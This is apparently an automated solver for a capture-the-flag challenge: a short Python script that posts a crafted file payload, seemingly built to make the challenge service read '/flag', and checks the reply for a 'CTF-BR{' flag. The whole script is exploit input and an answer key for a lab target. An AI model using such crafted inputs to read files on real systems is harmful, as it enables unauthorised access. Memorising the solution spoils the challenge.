import requests
import string

solution = """%!/flag f

 .-/-f

.........................................
|||||||||||||||||||||||||||||||||||||||||
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
'''''''''''''''''''''''''''''''''''''''''"""


# SOLVER
def solve(chall_ip, chall_port):

	try:
		requests.get(f"http://{chall_ip}:{chall_port}/")
	except :
		return -1

	t = requests.post(f"http://{chall_ip}:{chall_port}/",files={"dots":solution})

	if "CTF-BR{" in t.text:
		return 1
	else:
		return 0


